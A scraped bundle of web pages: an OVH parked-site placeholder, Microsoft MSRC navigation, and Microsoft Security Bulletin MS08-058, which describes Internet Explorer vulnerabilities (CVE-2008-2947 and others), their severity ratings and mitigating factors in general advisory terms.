=== Content from www.vupen.com_71674103_20250124_173421.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from go.microsoft.com_58e59d81_20250126_023445.html ===


This is the Trace Id: 81e0077fbf7a08197067080684f5a6a9

Skip to main content

[![](https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31)
Microsoft](https://www.microsoft.com)

MSRC

[MSRC](https://msrc.microsoft.com/)

MSRC

* [Home](https://msrc.microsoft.com/)
* Report an issue
  + [Report Security Vulnerability](https://msrc.microsoft.com/report/vulnerability/new)
  + [Report Abuse](https://msrc.microsoft.com/report/abuse)
  + [Report Infringement](https://msrc.microsoft.com/report/infringement)
  + [Submission FAQs](https://microsoft.com/msrc/faqs-report-an-issue)
* Customer guidance
  + [Security Update Guide](https://msrc.microsoft.com/update-guide)
  + [Exploitability index](https://microsoft.com/msrc/exploitability-index)
  + [Developer API documentation](https://aka.ms/msrc-api-docs-cvrf)
  + [Frequently Asked Questions](https://www.microsoft.com/msrc/faqs-security-update-guide)
  + [Technical Security Notifications](https://www.microsoft.com/en-us/msrc/technical-security-notifications)
* Engage
  + [Microsoft Bug Bounty Programs](https://microsoft.com/msrc/bounty)
  + [Microsoft Active Protections Program](https://microsoft.com/msrc/mapp)
  + [BlueHat Security Conference](https://www.microsoft.com/bluehat/)
  + [Researcher Recognition Program](https://www.microsoft.com/en-us/msrc/researcher-recognition-program)
  + [Windows Security Servicing Criteria](https://microsoft.com/msrc/windows-security-servicing-criteria)
  + [Researcher Resource Center](https://www.microsoft.com/en-us/msrc/msrc-researcher-resource-center)
* Who we are
  + [Mission](https://microsoft.com/msrc/mission)
  + [Cyber Defense Operations Center](https://microsoft.com/msrc/cdoc)
  + [Coordinated Vulnerability Disclosure](https://microsoft.com/msrc/cvd)
  + [Social](https://microsoft.com/msrc/social)
* Blogs
  + [Microsoft Security Response Center](https://aka.ms/blog-msrc)
  + [Security Research & Defense](https://aka.ms/blog-srd)
  + [BlueHat Conference Blog](https://aka.ms/blog-bluehat)
* Acknowledgments
  + [Security Researcher Acknowledgments](https://msrc.microsoft.com/update-guide/acknowledgment)
  + [Online Services Researcher Acknowledgments](https://msrc.microsoft.com/update-guide/acknowledgement/online)
  + [Security Researcher Leaderboard](https://msrc.microsoft.com/leaderboard)
* More

* All Microsoft
  + ## Global

    - [Microsoft 365](https://www.microsoft.com/microsoft-365)
    - [Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software)
    - [Copilot](https://copilot.microsoft.com/)
    - [Windows](https://www.microsoft.com/en-us/windows/)
    - [Surface](https://www.microsoft.com/surface)
    - [Xbox](https://www.xbox.com/)
    - [Deals](https://www.microsoft.com/en-us/store/b/sale?icid=gm_nav_L0_salepage)
    - [Small Business](https://www.microsoft.com/en-us/store/b/business)
    - [Support](https://support.microsoft.com/en-us)
  + Software
    Software
    - [Windows Apps](https://www.microsoft.com/en-us/store/apps/windows?icid=CNavAppsWindowsApps)
    - [AI](https://www.microsoft.com/en-us/ai)
    - [Outlook](https://www.microsoft.com/en-us/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook)
    - [OneDrive](https://www.microsoft.com/en-us/microsoft-365/onedrive/online-cloud-storage)
    - [Microsoft Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software)
    - [OneNote](https://www.microsoft.com/en-us/microsoft-365/onenote/digital-note-taking-app)
    - [Microsoft Edge](https://www.microsoft.com/edge)
    - [Skype](https://www.skype.com/en/)
  + PCs & Devices
    PCs & Devices
    - [Computers](https://www.microsoft.com/en-us/store/b/pc?icid=CNavDevicesPC)
    - [Shop Xbox](https://www.microsoft.com/en-us/store/b/xbox?icid=CNavDevicesXbox)
    - [Accessories](https://www.microsoft.com/en-us/store/b/accessories?icid=CNavDevicesAccessories)
    - [VR & mixed reality](https://www.microsoft.com/en-us/store/b/virtualreality?icid=CNavVirtualReality)
    - [Certified Refurbished](https://www.microsoft.com/en-us/store/b/certified-refurbished-products)
    - [Trade-in for cash](https://www.microsoft.com/en-us/store/b/microsoft-trade-in)
  + Entertainment
    Entertainment
    - [Xbox Game Pass Ultimate](https://www.xbox.com/en-us/games/store/xbox-game-pass-ultimate/cfq7ttc0khs0?icid=CNavAllXboxGamePassUltimate)
    - [PC Game Pass](https://www.xbox.com/en-us/games/store/pc-game-pass/cfq7ttc0kgq8?icid=CNavAllPCGamePass)
    - [Xbox games](https://www.microsoft.com/en-us/store/b/xboxgames?icid=CNavGamesXboxGames)
    - [PC and Windows games](https://www.microsoft.com/en-us/store/games/windows?icid=CNavGamesWindowsGames)
    - [Movies & TV](https://www.microsoft.com/en-us/store/movies-and-tv?icid=TopNavMoviesTv)
  + Business
    Business
    - [Microsoft Cloud](https://www.microsoft.com/en-us/microsoft-cloud)
    - [Microsoft Security](https://www.microsoft.com/en-us/security)
    - [Dynamics 365](https://www.microsoft.com/en-us/dynamics-365)
    - [Microsoft 365 for business](https://www.microsoft.com/en-us/microsoft-365/business)
    - [Microsoft Power Platform](https://www.microsoft.com/en-us/power-platform)
    - [Windows 365](https://www.microsoft.com/en-us/windows-365)
    - [Microsoft Industry](https://www.microsoft.com/en-us/industry)
    - [Small Business](https://www.microsoft.com/en-us/store/b/business?icid=CNavBusinessStore)
  + Developer & IT
    Developer & IT
    - [Azure](https://azure.microsoft.com/en-us/)
    - [Microsoft Developer](https://developer.microsoft.com/en-us/)
    - [Documentation](https://learn.microsoft.com/docs/)
    - [Microsoft Learn](https://learn.microsoft.com/)
    - [Microsoft Tech Community](https://techcommunity.microsoft.com/)
    - [Azure Marketplace](https://azuremarketplace.microsoft.com/en-us/)
    - [AppSource](https://appsource.microsoft.com/en-us/)
    - [Visual Studio](https://visualstudio.microsoft.com/)
  + Other
    Other
    - [Microsoft Rewards](https://www.microsoft.com/rewards)
    - [Free downloads & security](https://www.microsoft.com/en-us/download)
    - [Education](https://www.microsoft.com/en-us/education)
    - [Gift cards](https://www.microsoft.com/en-us/store/b/gift-cards)
    - [Licensing](https://www.microsoft.com/licensing/)
    - [Unlocked stories](https://unlocked.microsoft.com/)
  + [View Sitemap](https://www.microsoft.com/en-us/sitemap)

Search
Search Microsoft.com

* No results

Cancel

# Microsoft Security Response Center

![Microsoft Security Response Center](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2iDfp?scl=1)

## Protection, detection, and response

The **Microsoft Security Response Center** is part of the defender community and on the front line of security response evolution. For over twenty years, we have been engaged with security researchers working to protect customers and the broader ecosystem.

* ![](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2jxFK-report_issue_icon?wid=40&hei=40)
  [Report an issue](https://msrc.microsoft.com/create-report?c=icon)
* ![](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2iIyM-guidance_icon?wid=40&hei=40)
  [Security Update Guide](https://msrc.microsoft.com/update-guide)
* ![](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2m3TR-Shield2?wid=40&hei=40)
  [Bounty programs](https://microsoft.com/msrc/bounty)
* ![](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2iIyL-who_we_are_icon?wid=40&hei=40)
  [Who we are](https://microsoft.com/msrc/mission)
* ![](https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/RE2iA1s-blog_icon?wid=40&hei=40)
  [Blogs](https://msrc-blog.microsoft.com)

What's new

* [Surface Pro](https://www.microsoft.com/en-us/surface/devices/surface-pro-11th-edition)
* [Surface Laptop](https://www.microsoft.com/en-us/surface/devices/surface-laptop-7th-edition)
* [Surface Laptop Studio 2](https://www.microsoft.com/en-us/d/Surface-Laptop-Studio-2/8rqr54krf1dz)
* [Surface Laptop Go 3](https://www.microsoft.com/en-us/d/Surface-Laptop-Go-3/8p0wwgj6c6l2)
* [Microsoft Copilot](https://www.microsoft.com/en-us/microsoft-copilot)
* [AI in Windows](https://www.microsoft.com/en-us/windows/copilot-ai-features)
* [Explore Microsoft products](https://www.microsoft.com/en-us/microsoft-products-and-apps)
* [Windows 11 apps](https://www.microsoft.com/windows/windows-11-apps)

Microsoft Store

* [Account profile](https://account.microsoft.com/)
* [Download Center](https://www.microsoft.com/en-us/download)
* [Microsoft Store support](https://go.microsoft.com/fwlink/?linkid=2139749)
* [Returns](https://www.microsoft.com/en-us/store/b/returns)
* [Order tracking](https://www.microsoft.com/en-us/store/b/order-tracking)
* [Certified Refurbished](https://www.microsoft.com/en-us/store/b/certified-refurbished-products)
* [Microsoft Store Promise](https://www.microsoft.com/en-us/store/b/why-microsoft-store?icid=footer_why-msft-store_7102020)
* [Flexible Payments](https://www.microsoft.com/en-us/store/b/payment-financing-options?icid=footer_financing_vcc)

Education

* [Microsoft in education](https://www.microsoft.com/en-us/education)
* [Devices for education](https://www.microsoft.com/en-us/education/devices/overview)
* [Microsoft Teams for Education](https://www.microsoft.com/en-us/education/products/teams)
* [Microsoft 365 Education](https://www.microsoft.com/en-us/education/products/microsoft-365)
* [How to buy for your school](https://www.microsoft.com/education/how-to-buy)
* [Educator training and development](https://education.microsoft.com/)
* [Deals for students and parents](https://www.microsoft.com/en-us/store/b/education)
* [Azure for students](https://azure.microsoft.com/en-us/free/students/)

Business

* [Microsoft Cloud](https://www.microsoft.com/en-us/microsoft-cloud)
* [Microsoft Security](https://www.microsoft.com/en-us/security)
* [Dynamics 365](https://www.microsoft.com/en-us/dynamics-365)
* [Microsoft 365](https://www.microsoft.com/en-us/microsoft-365/business)
* [Microsoft Power Platform](https://www.microsoft.com/en-us/power-platform)
* [Microsoft Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software)
* [Microsoft 365 Copilot](https://www.microsoft.com/en-us/microsoft-365/copilot/copilot-for-work)
* [Small Business](https://www.microsoft.com/en-us/store/b/business?icid=CNavBusinessStore)

Developer & IT

* [Azure](https://azure.microsoft.com/en-us/)
* [Microsoft Developer](https://developer.microsoft.com/en-us/)
* [Documentation](https://learn.microsoft.com/docs/)
* [Microsoft Learn](https://learn.microsoft.com/)
* [Microsoft Tech Community](https://techcommunity.microsoft.com/)
* [Azure Marketplace](https://azuremarketplace.microsoft.com/en-us/)
* [AppSource](https://appsource.microsoft.com/en-us/)
* [Visual Studio](https://visualstudio.microsoft.com/)

Company

* [Careers](https://careers.microsoft.com/)
* [About Microsoft](https://www.microsoft.com/about)
* [Company news](https://news.microsoft.com/)
* [Privacy at Microsoft](https://privacy.microsoft.com/en-us)
* [Investors](https://www.microsoft.com/investor/default.aspx)
* [Diversity and inclusion](https://www.microsoft.com/en-us/diversity/)
* [Accessibility](https://www.microsoft.com/en-us/accessibility)
* [Sustainability](https://www.microsoft.com/en-us/sustainability/)

[English (United States)](https://www.microsoft.com/en-us/locale.aspx)
[Your Privacy Choices Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)
[Your Privacy Choices Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

[Consumer Health Privacy](https://go.microsoft.com/fwlink/?linkid=2259814)

* [Sitemap](https://www.microsoft.com/en-us/sitemap1.aspx)
* [Contact Microsoft](https://support.microsoft.com/contactus)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* Manage cookies
* [Terms of use](https://go.microsoft.com/fwlink/?LinkID=206977)
* [Trademarks](https://go.microsoft.com/fwlink/?linkid=2196228)
* [Safety & eco](https://go.microsoft.com/fwlink/?linkid=2196227)
* [Recycling](https://www.microsoft.com/en-us/legal/compliance/recycling)
* [About our ads](https://choice.microsoft.com)
* © Microsoft 2025



=== Content from docs.microsoft.com_ae1acf64_20250124_173422.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

Exit focus mode

Read in English

Save

Table of contentsRead in English

Save

Add to plan
[Edit](https://github.com/MicrosoftDocs/security-updates/blob/live/security-updates/SecurityBulletins/2008/ms08-058.md "Edit This Document")

---

#### Share via

Facebook
x.com
LinkedIn
Email

---

Print

Table of contents

* Article
* 06/08/2023
* 6 contributors

Feedback

## In this article

Security Bulletin

# Microsoft Security Bulletin MS08-058 - Critical

## Cumulative Security Update for Internet Explorer (956390)

Published: October 14, 2008 | Updated: November 12, 2008

**Version:** 1.2

### General Information

#### Executive Summary

This security update resolves five privately reported vulnerabilities and one publicly disclosed vulnerability. The vulnerabilities could allow information disclosure or remote code execution if a user views a specially crafted Web page using Internet Explorer. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

This security update is rated Critical for Internet Explorer 5.01 and Internet Explorer 6 Service Pack 1, running on all supported editions of Microsoft Windows 2000, and for Internet Explorer 6 running on all supported editions of Windows XP. For Internet Explorer 7 running on all supported editions of Windows XP and Windows Vista, this security update is rated Important. Otherwise, this security update is rated Moderate or Low. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses these vulnerabilities by modifying the way that Internet Explorer handles the error resulting in the exploitable condition. For more information about the vulnerabilities, see the Frequently Asked Questions (FAQ) subsection under the next section, **Vulnerability Information**.

**Recommendation.** Microsoft recommends that customers apply the update immediately.

**Known Issues.** None

#### Affected and Non-Affected Software

The software listed here have been tested to determine which versions or editions are affected. Other versions or editions are either past their support life cycle or are not affected. To determine the support life cycle for your software version or edition, visit [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

**Affected Software**

| Operating System | Component | Maximum Security Impact | Aggregate Severity Rating | Bulletins Replaced by This Update |
| --- | --- | --- | --- | --- |
| Internet Explorer 5.01 and Internet Explorer 6 Service Pack 1 |  |  |  |  |
| Microsoft Windows 2000 Service Pack 4 | [Microsoft Internet Explorer 5.01 Service Pack 4](https://www.microsoft.com/download/details.aspx?familyid=257c0478-56dd-42eb-a90e-607d01613db7) | Remote Code Execution | Critical | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Microsoft Windows 2000 Service Pack 4 | [Microsoft Internet Explorer 6 Service Pack 1](https://www.microsoft.com/download/details.aspx?familyid=02390258-08e9-4b75-960d-be081b749558) | Remote Code Execution | Critical | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Internet Explorer 6 |  |  |  |  |
| Windows XP Service Pack 2 and Windows XP Service Pack 3 | [Microsoft Internet Explorer 6](https://www.microsoft.com/download/details.aspx?familyid=a7f0f47b-b1ee-4516-9fbf-bf8e579963d0) | Remote Code Execution | Critical | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2 | [Microsoft Internet Explorer 6](https://www.microsoft.com/download/details.aspx?familyid=234c05fb-988b-4e02-aab6-bb23e447df3d) | Remote Code Execution | Critical | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows Server 2003 Service Pack 1 and Windows Server 2003 Service Pack 2 | [Microsoft Internet Explorer 6](https://www.microsoft.com/download/details.aspx?familyid=ae8d22d5-20aa-471d-a423-f54c9d75febe) | Remote Code Execution | Moderate | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows Server 2003 x64 Edition and Windows Server 2003 x64 Edition Service Pack 2 | [Microsoft Internet Explorer 6](https://www.microsoft.com/download/details.aspx?familyid=07fc88c4-2571-4a4d-b573-ae576798ab4c) | Remote Code Execution | Moderate | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows Server 2003 with SP1 for Itanium-based Systems and Windows Server 2003 with SP2 for Itanium-based Systems | [Microsoft Internet Explorer 6](https://www.microsoft.com/download/details.aspx?familyid=b68937af-f04a-4d1e-9d7f-ec92af5194de) | Remote Code Execution | Moderate | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Internet Explorer 7 |  |  |  |  |
| Windows XP Service Pack 2 and Windows XP Service Pack 3 | [Windows Internet Explorer 7](https://www.microsoft.com/download/details.aspx?familyid=4e73de2b-05e6-4901-9bac-46d8f469e635) | Information Disclosure | Important | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2 | [Windows Internet Explorer 7](https://www.microsoft.com/download/details.aspx?familyid=ccf7a3e3-ec30-4b95-9a86-00032301513c) | Information Disclosure | Important | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows Server 2003 Service Pack 1 and Windows Server 2003 Service Pack 2 | [Windows Internet Explorer 7](https://www.microsoft.com/download/details.aspx?familyid=feaf2adf-7892-4dbf-a147-db4d5dbe52f3) | Information Disclosure | Low | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows Server 2003 x64 Edition and Windows Server 2003 x64 Edition Service Pack 2 | [Windows Internet Explorer 7](https://www.microsoft.com/download/details.aspx?familyid=319dba34-07ca-47f9-a1e9-20df2df7966b) | Information Disclosure | Low | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows Server 2003 with SP1 for Itanium-based Systems and Windows Server 2003 with SP2 for Itanium-based Systems | [Windows Internet Explorer 7](https://www.microsoft.com/download/details.aspx?familyid=47381d91-4a14-4a09-96b3-3345155df52d) | Information Disclosure | Low | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows Vista and Windows Vista Service Pack 1 | [Windows Internet Explorer 7](https://www.microsoft.com/download/details.aspx?familyid=4756e04b-6e1c-4d78-a3c0-17f6b4b97975) | Information Disclosure | Important | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows Vista x64 Edition and Windows Vista x64 Edition Service Pack 1 | [Windows Internet Explorer 7](https://www.microsoft.com/download/details.aspx?familyid=bd19c72b-4f83-47ab-93be-d2c286e732c4) | Information Disclosure | Important | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows Server 2008 for 32-bit Systems\* | [Windows Internet Explorer 7](https://www.microsoft.com/download/details.aspx?familyid=ec73f416-2204-42d6-8932-c96578ac819f) | Information Disclosure | Low | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows Server 2008 for x64-based Systems\* | [Windows Internet Explorer 7](https://www.microsoft.com/download/details.aspx?familyid=baacd1c2-9764-4fea-bd4d-c49791974fef) | Information Disclosure | Low | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |
| Windows Server 2008 for Itanium-based Systems | [Windows Internet Explorer 7](https://www.microsoft.com/download/details.aspx?familyid=250a45dd-7eae-4440-bd10-02a703940976) | Information Disclosure | Low | [MS08-045](https://go.microsoft.com/fwlink/?linkid=122772) |

**\*Windows Server 2008 server core installation not affected.** The vulnerabilities addressed by this update do not affect supported editions of Windows Server 2008 if Windows Server 2008 was installed using the Server Core installation option. For more information on this installation option, see [Server Core](https://msdn.microsoft.com/library/ms723891%28vs.85%29.aspx). Note that the Server Core installation option does not apply to certain editions of Windows Server 2008; see [Compare Server Core Installation Options](https://www.microsoft.com/windowsserver2008/en/us/compare-core-installation.aspx).

## Frequently Asked Questions (FAQ) Related to This Security Update

**Where are the file information details?**

The file information details can be found in the [Microsoft Knowledge Base Article 956390](https://support.microsoft.com/kb/956390).

**I am using an older release of the software discussed in this security bulletin. What should I do?**

The affected software listed in this bulletin have been tested to determine which releases are affected. Other releases are past their support life cycle. To determine the support life cycle for your software release, visit [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742).

It should be a priority for customers who have older releases of the software to migrate to supported releases to prevent potential exposure to vulnerabilities. For more information about the Windows Product Lifecycle, visit [Microsoft Support Lifecycle](https://go.microsoft.com/fwlink/?linkid=21742). For more information about the extended security update support period for these software releases, visit the [Microsoft Product Support Services Web site](https://go.microsoft.com/fwlink/?linkid=33328).

Customers who require custom support for older software must contact their Microsoft account team representative, their Technical Account Manager, or the appropriate Microsoft partner representative for custom support options. Customers without an Alliance, Premier, or Authorized Contract can contact their local Microsoft sales office. For contact information, visit the [Microsoft Worldwide Information Web site](https://go.microsoft.com/fwlink/?linkid=33329), select the country, and then click **Go** to see a list of telephone numbers. When you call, ask to speak with the local Premier Support sales manager. For more information, see the [Windows Operating System Product Support Lifecycle FAQ](https://go.microsoft.com/fwlink/?linkid=33330).

### Vulnerability Information

## Severity Ratings and Vulnerability Identifiers

| Affected Software | Window Location Property Cross-Domain Vulnerability - CVE-2008-2947 | HTML Element Cross-Domain Vulnerability - CVE-2008-3472 | Event Handling Cross-Domain Vulnerability - CVE-2008-3473 | Cross-Domain Information Disclosure Vulnerability - CVE-2008-3474 | Uninitialized Memory Corruption Vulnerability - CVE-2008-3475 | HTML Objects Memory Corruption Vulnerability - CVE-2008-3476 | Aggregate Severity Rating |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Internet Explorer 5.01 Service Pack 4 when installed on Microsoft Windows 2000 Service Pack 4 | **Critical** \ Remote Code Execution | Not applicable | Not applicable | Not applicable | Not applicable | **Critical** \ Remote Code Execution | **Critical** |
| Internet Explorer 6 Service Pack 1 when installed on Microsoft Windows 2000 Service Pack 4 | **Critical** \ Remote Code Execution | **Critical** \ Remote Code Execution | **Critical** \ Remote Code Execution | **Important** \ Information Disclosure | **Critical** \ Remote Code Execution | **Critical** \ Remote Code Execution | **Critical** |
| Internet Explorer 6 for Windows XP Service Pack 2 and Windows XP Service Pack 3 | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Critical** \ Remote Code Execution | **Critical** \ Remote Code Execution | **Critical** |
| Internet Explorer 6 for Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2 | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Critical** \ Remote Code Execution | **Critical** \ Remote Code Execution | **Critical** |
| Internet Explorer 6 for Windows Server 2003 Service Pack 1 and Windows Server 2003 Service Pack 2 | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Moderate** \ Remote Code Execution | **Moderate** \ Remote Code Execution | **Moderate** |
| Internet Explorer 6 for Windows Server 2003 x64 Edition and Windows Server 2003 x64 Edition Service Pack 2 | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Moderate** \ Remote Code Execution | **Moderate** \ Remote Code Execution | **Moderate** |
| Internet Explorer 6 for Windows Server 2003 with SP1 for Itanium-based Systems and Windows Server 2003 with SP2 for Itanium-based Systems | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Moderate** \ Remote Code Execution | **Moderate** \ Remote Code Execution | **Moderate** |
| Internet Explorer 7 for Windows XP Service Pack 2 and Windows XP Service Pack 3 | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | Not applicable | Not applicable | **Important** |
| Internet Explorer 7 for Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2 | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | Not applicable | Not applicable | **Important** |
| Internet Explorer 7 for Windows Server 2003 Service Pack 1 and Windows Server 2003 Service Pack 2 | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | Not applicable | Not applicable | **Low** |
| Internet Explorer 7 for Windows Server 2003 x64 Edition and Windows Server 2003 x64 Edition Service Pack 2 | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | Not applicable | Not applicable | **Low** |
| Internet Explorer 7 for Windows Server 2003 with SP1 for Itanium-based Systems and Windows Server 2003 with SP2 for Itanium-based Systems | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | Not applicable | Not applicable | **Low** |
| Internet Explorer 7 in Windows Vista and Internet Explorer 7 in Windows Vista Service Pack 1 | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | \ Not applicable | \ Not applicable | **Important** |
| Internet Explorer 7 in Windows Vista x64 Edition and Internet Explorer 7 in Windows Vista x64 Edition Service Pack 1 | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | **Important** \ Information Disclosure | Not applicable | Not applicable | **Important** |
| Internet Explorer 7 in Windows Server 2008 for 32-bit Systems\* | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | Not applicable | Not applicable | **Low** |
| Internet Explorer 7 in Windows Server 2008 for x64-based Systems\* | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | Not applicable | Not applicable | **Low** |
| Internet Explorer 7 in Windows Server 2008 for Itanium-based Systems | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | **Low** \ Information Disclosure | Not applicable | Not applicable | **Low** |

**\*Windows Server 2008 server core installation not affected.** The vulnerabilities addressed by this update do not affect supported editions of Windows Server 2008 if Windows Server 2008 was installed using the Server Core installation option. For more information on this installation option, see [Server Core](https://msdn.microsoft.com/library/ms723891%28vs.85%29.aspx). Note that the Server Core installation option does not apply to certain editions of Windows Server 2008; see [Compare Server Core Installation Options](https://www.microsoft.com/windowsserver2008/en/us/compare-core-installation.aspx).

## Window Location Property Cross-Domain Vulnerability - CVE-2008-2947

A remote code execution or information disclosure vulnerability exists in Internet Explorer that could allow an attacker to gain access to a browser window in another domain or Internet Explorer zone. An attacker could exploit the vulnerability by constructing a specially crafted Web page that could allow remote code execution or information disclosure, depending on the operating system, if a user viewed the Web page.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2008-2947](https://www.cve.org/CVERecord?id=CVE-2008-2947).

#### Mitigating Factors for Window Location Property Cross-Domain Vulnerability - CVE-2008-2947

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* In a Web-based attack scenario, an attacker could host a Web site that contains a Web page that is used to exploit this vulnerability. In addition, compromised Web sites and Web sites that accept or host user-provided content or advertisements could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or Instant Messenger message that takes users to the attackerâs Web site.
* An attacker who successfully exploited this vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.
